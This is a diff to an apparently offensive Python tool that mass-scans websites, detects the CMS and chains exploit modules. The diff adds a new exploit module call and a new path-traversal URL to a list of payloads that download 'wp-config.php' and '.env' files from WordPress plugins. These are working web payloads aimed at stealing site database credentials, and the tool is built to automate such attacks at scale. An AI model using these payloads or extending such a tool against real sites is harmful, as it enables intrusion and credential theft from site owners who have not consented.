@@ -2,6 +2,8 @@ import os, requests, colorama, socket, getpass, subprocess, json, time, re, date
 import urllib3
 from Exploits.com_bjcontact import bj
 from modules.search import dorker
+from Exploits.asistorage import asistorage
+import Exploits.colors
 from multiprocessing import Pool, freeze_support
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from colorama import Fore
@@ -117,7 +119,8 @@ DowloadConfig = [
  '/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
  '/wp/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
  '/wordpress/wp-admin/edit.php?post_type=wd_ads_ads&export=export_csv&path=../wp-config.php',
- '/.env']
+ '/.env',
+ '/wp-admin/admin.php?page=supsystic-backup&tab=bupLog&download=../wp-config.php']
 
 
 
@@ -762,7 +765,7 @@ def serialize(url):
 def parms(site):
     ## LIL PRAM SPIDER
 
-
+    filename = "Results/PramSpider.txt"
     GetLink = requests.get(site, timeout=10, headers=HEADERS)
     urls = re.findall('href=[\\\'"]?([^\\\'" >]+)', str(GetLink.text).replace(site, ''))
     if len(urls) != 0:
@@ -776,7 +779,7 @@ def parms(site):
                     if "///" in urls:
                         pass
                     #print(url.replace('///', '/'))
-                    filename = "Results/PramSpider.txt"
+                    
                     with open(filename, "a+") as f:
                         f.write(f"{url.replace('///', '/')}\n")
                         #f.write(test.text)
@@ -896,7 +899,7 @@ def detect(url):
             return name
         
         else:
-            name = 'Unknown'
+            name = f'{RED}Unknown'
             return name
 
 
@@ -980,11 +983,12 @@ def auto(url):
             print(f"\n {PURPLE}[ {GREEN}~ {RESET} Could not detect CMS {GREEN}~{RESET} {PURPLE}]{RESET}\n")
             #print(f" {PURPLE}[ {GREEN}~ {RESET} Starting Dirscan! {GREEN}~{RESET} {PURPLE}]{RESET}")
             Exploit(url)
+            asistorage(url)
             Exploitt(site)
             Triconsole(url)
             
     except Exception as e:
-        #print(e)
+        #print(e) debugging
         print(f"\n {PURPLE}[ {GREEN}? {PURPLE}]{RESET} Connection Timout")
         return
         
